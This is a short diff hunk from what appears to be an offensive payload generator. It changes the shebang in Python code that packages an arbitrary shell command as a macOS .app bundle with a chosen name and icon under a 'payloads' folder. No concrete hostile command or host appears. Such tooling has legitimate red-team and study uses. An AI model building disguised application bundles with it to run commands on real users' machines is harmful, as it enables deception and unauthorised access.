@@ -33,7 +33,7 @@ mv """+icon+""" payloads/macos_application/"""+name+""".app/Contents/Resources/P
 		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/PowerShell.sh"
                 sas = "payloads/macos_application/"+name+".app"
 		payload = """\
-#! /usr/local/bin/env bash
+#! /usr/bin/env bash
 """+shell_command+"""
                 """
 		f = open(payload_save_path,"w")
